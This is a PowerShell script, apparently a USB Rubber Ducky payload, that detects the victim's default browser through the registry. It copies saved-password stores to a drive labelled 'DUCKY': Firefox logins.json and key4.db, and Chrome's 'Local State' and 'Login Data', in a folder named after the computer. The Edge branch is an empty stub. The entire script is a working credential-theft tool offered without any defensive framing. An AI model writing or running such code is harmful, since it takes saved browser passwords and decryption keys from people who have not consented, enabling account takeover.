$ducky = (Get-Volume -FileSystemLabel 'DUCKY').DriveLetter + ":";
$guid = [guid]::NewGuid().ToString().Substring(0, 8);
$newDir = "${ducky}\UserProfile_${env:COMPUTERNAME}_${guid}";

$filePaths = @();
# $sourceFile1 = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State";
# $sourceFile2 = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data";

$progId = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice').ProgId;

switch -Regex ($progId) {
    # Case: Firefox (any version)
    { $_ -imatch '^firefox' } {
        Write-Output "Firefox detected: $progId"
        $destinationDir = "$newDir\Firefox";
        New-Item -Path $destinationDir -ItemType Directory -Force;
        
        $profileBaseDir = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
        $profileDirs = Get-ChildItem -Path $profileBaseDir -Directory | Where-Object { $_.Name -like '*default*' }

        foreach ($profileDir in $profileDirs) {
            $profilePath = $profileDir.FullName
            # Create a specific directory named after the original profile directory
            $profileName = $profileDir.Name
            $profileDestinationDir = Join-Path -Path $destinationDir -ChildPath $profileName
            New-Item -Path $profileDestinationDir -ItemType Directory -Force

            # Define file paths
            $filesToCopy = @('logins.json', 'key4.db')

            foreach ($fileName in $filesToCopy) {
                $sourceFile = Join-Path -Path $profilePath -ChildPath $fileName
                $destinationFile = Join-Path -Path $profileDestinationDir -ChildPath $fileName
                
                if (Test-Path $sourceFile) {
                    Copy-Item -Path $sourceFile -Destination $destinationFile -Force
                } else {
                    Write-Output "File not found: $sourceFile"
                }
            }
        }

        break;
    }

    # Case: Microsoft Edge
    { $_ -imatch '^MSEdgeHTM' } {
        Write-Output "Microsoft Edge detected: $progId"
        $destinationDir = "$newDir\Edge";
        New-Item -Path $destinationDir -ItemType Directory -Force;
        # Add logic specific to Microsoft Edge here
        break
    }

    # Case: Google Chrome
    { $_ -imatch '^ChromeHTML' } {
        Write-Output "Google Chrome detected: $progId"
        $destinationDir = "$newDir\Chrome";
        New-Item -Path $destinationDir -ItemType Directory -Force;

        $filePaths = @(
            "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State",
            "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        );

        foreach ($filePath in $filePaths) {
            if (Test-Path $filePath) {
                Copy-Item -Path $filePath -Destination $destinationDir
            } else {
                Write-Output "File not found: $filePath"
            }
        }
        break
    }

    Default {
        Write-Output "Unknown program: $progId"
    }
}

# foreach ($filePath in $filePaths) {
#     if (Test-Path $filePath) {
#         Write-Output "Processing file: $filePath";
#     } else {
#         Write-Output "File not found: $filePath"
#     }
# }